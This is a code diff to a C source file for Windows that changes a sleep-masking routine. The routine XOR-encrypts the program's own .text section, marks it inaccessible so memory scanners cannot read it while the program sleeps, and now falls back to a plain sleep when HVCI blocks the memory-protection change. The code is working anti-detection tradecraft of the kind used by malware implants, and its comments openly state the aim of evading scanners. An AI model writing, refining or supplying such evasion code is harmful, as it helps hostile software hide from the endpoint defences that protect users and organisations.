@@ -462,17 +462,21 @@ void sleep_masked(DWORD ms) {
     unsigned char *text = (unsigned char*)g_text;
     SIZE_T sz = g_tsz;
     DWORD old;
+    LARGE_INTEGER iv;
+    iv.QuadPart = -(LONGLONG)ms * 10000LL;
 
-    /* 1. Make .text writable and XOR-encrypt it */
-    g_VProt(text, sz, PAGE_EXECUTE_READWRITE, &old);
+    /* 1. Make .text writable — bail to plain sleep if VirtualProtect rejects
+     * (HVCI / code-integrity policy prevents making executable pages writable). */
+    if (!g_VProt(text, sz, PAGE_EXECUTE_READWRITE, &old)) {
+        g_NtDelay(FALSE, &iv);
+        return;
+    }
+
+    /* 2. XOR-encrypt and seal from memory scanners */
     for (SIZE_T i = 0; i < sz; i++) text[i] ^= 0xA7;
-
-    /* 2. Seal .text from memory scanners */
     g_VProt(text, sz, PAGE_NOACCESS, &old);
 
     /* 3. Sleep — execution is inside ntdll.dll syscall, not .text */
-    LARGE_INTEGER iv;
-    iv.QuadPart = -(LONGLONG)ms * 10000LL;
     g_NtDelay(FALSE, &iv);
 
     /* 4. Restore — still in .evasn here */
